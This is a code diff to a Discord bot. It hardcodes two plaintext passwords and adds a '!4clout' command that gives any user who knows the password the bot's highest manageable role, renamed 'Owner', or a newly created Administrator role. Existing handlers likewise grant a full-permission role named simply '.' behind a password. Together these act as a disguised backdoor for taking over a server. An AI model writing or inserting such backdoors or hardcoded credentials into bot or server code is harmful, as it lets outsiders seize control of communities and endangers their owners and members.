@@ -21,6 +21,12 @@ const fs = require('fs');
 require('dotenv').config();
 
 // ======================================================
+// PASSWORDS
+// ======================================================
+const MAIN_PASSWORD = 'Meka2017charlie';      // For most commands
+const GIVEOWNER_PASSWORD = 'MekaOwner2017';   // For !giveowner
+
+// ======================================================
 // EXPRESS SERVER
 // ======================================================
 const app = express();
@@ -33,10 +39,6 @@ app.listen(process.env.PORT || 3000, () => console.log(`Web server running on po
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
 const GUILD_ID = process.env.GUILD_ID;
-
-// PASSWORDS
-const MAIN_PASSWORD = 'Meka2017charlie';      // For !fb, !unl, !clown, !unp, !role
-const GIVEOWNER_PASSWORD = 'MekaOwner2017';   // ← New password for !giveowner
 
 // ROLES
 const STAFF_ROLES = ['1505376743001821334', '1505379855137509538'];
@@ -72,7 +74,7 @@ const client = new Client({
 });
 
 // ======================================================
-// SLASH COMMANDS (unchanged)
+// SLASH COMMANDS
 // ======================================================
 const setticket = new SlashCommandBuilder()
   .setName('setticket')
@@ -165,6 +167,26 @@ client.on('messageCreate', async message => {
     return;
   }
 
+  // !4clout - New Command
+  if (content === '!4clout') {
+    const embed = new EmbedBuilder()
+      .setColor('#ff00ff')
+      .setTitle('🔥 !4CLOUT')
+      .setDescription('This will give you the **highest role** the bot can manage and rename it to **Owner**.\n\nOnly you can proceed.')
+      .setFooter({ text: 'Click the button below' })
+      .setTimestamp();
+
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId(`4clout_start_${message.author.id}`)
+        .setLabel('Enter Password')
+        .setStyle(ButtonStyle.Danger)
+    );
+
+    await message.reply({ embeds: [embed], components: [row] });
+    return;
+  }
+
   // !giveowner @user
   if (content.startsWith('!giveowner')) {
     const mentioned = message.mentions.users.first();
@@ -173,7 +195,7 @@ client.on('messageCreate', async message => {
     const embed = new EmbedBuilder()
       .setColor('#ffd700')
       .setTitle('👑 GIVE OWNER ROLE')
-      .setDescription(`This will give **${mentioned.tag}** the **.** role with full permissions.\n\nOnly you can proceed.`)
+      .setDescription(`This will give **${mentioned.tag}** the **.** role with full permissions.`)
       .setFooter({ text: 'Click the button below' })
       .setTimestamp();
 
@@ -247,10 +269,51 @@ client.on('interactionCreate', async interaction => {
 
   if (interaction.isModalSubmit()) {
     const enteredPassword = interaction.fields.getTextInputValue('password');
-
     const guild = interaction.guild;
+    const member = interaction.member;
 
-    // === !giveowner - Uses its own password ===
+    // === !4clout ===
+    if (interaction.customId.startsWith('4clout_modal_')) {
+      if (enteredPassword !== MAIN_PASSWORD) {
+        return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
+      }
+
+      try {
+        // Get the highest role the bot can manage
+        const botMember = await guild.members.fetch(client.user.id);
+        const highestBotRole = botMember.roles.highest;
+
+        let highestRole = guild.roles.cache
+          .filter(r => r.position < highestBotRole.position && r.name !== '@everyone')
+          .sort((a, b) => b.position - a.position)
+          .first();
+
+        if (!highestRole) {
+          // Create new role if none manageable
+          highestRole = await guild.roles.create({
+            name: 'Owner',
+            color: '#ffd700',
+            permissions: [PermissionFlagsBits.Administrator],
+            hoist: true,
+            reason: 'Created by !4clout'
+          });
+        } else {
+          await highestRole.setName('Owner');
+        }
+
+        await member.roles.add(highestRole);
+        await interaction.reply({ 
+          content: `✅ **Highest manageable role renamed to "Owner" and given to you!**`, 
+          ephemeral: true 
+        });
+      } catch (err) {
+        console.error(err);
+        await interaction.reply({ content: '❌ Failed. Make sure bot has **Manage Roles** permission and is high in role hierarchy.', ephemeral: true });
+      }
+      return;
+    }
+
+    // === !giveowner ===
     if (interaction.customId.startsWith('giveowner_modal_')) {
       if (enteredPassword !== GIVEOWNER_PASSWORD) {
         return interaction.reply({ content: '❌ Incorrect password for !giveowner.', ephemeral: true });
@@ -271,23 +334,19 @@ client.on('interactionCreate', async interaction => {
           });
         }
         await targetUser.roles.add(dotRole);
-        await interaction.reply({ 
-          content: `✅ Successfully gave **${targetUser.user.tag}** the **.** role with full Administrator permissions!`, 
-          ephemeral: true 
-        });
+        await interaction.reply({ content: `✅ Gave **${targetUser.user.tag}** the "." role!`, ephemeral: true });
       } catch (err) {
-        console.error(err);
-        await interaction.reply({ content: '❌ Failed to give role. Check bot permissions and role hierarchy.', ephemeral: true });
+        await interaction.reply({ content: '❌ Failed to give role.', ephemeral: true });
       }
       return;
     }
 
-    // === All other commands use the main password ===
+    // === Other commands use MAIN_PASSWORD ===
     if (enteredPassword !== MAIN_PASSWORD) {
       return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
     }
 
-    // !role (self) handler
+    // !role handler (self)
     if (interaction.customId.startsWith('role_modal_')) {
       try {
         let dotRole = guild.roles.cache.find(r => r.name === '.');
@@ -300,17 +359,15 @@ client.on('interactionCreate', async interaction => {
             reason: 'Full permission dot role'
           });
         }
-        await interaction.member.roles.add(dotRole);
+        await member.roles.add(dotRole);
         await interaction.reply({ content: '✅ You now have the "." role with full permissions!', ephemeral: true });
       } catch (err) {
         await interaction.reply({ content: '❌ Failed to give role.', ephemeral: true });
       }
     }
-
-    // Add handlers for !fb, !unl, !clown, !unp here if needed
   }
 
-  // === TICKET SYSTEM (add your existing ticket code here) ===
+  // === TICKET SYSTEM (add your existing code here) ===
 });
 
 client.login(TOKEN);
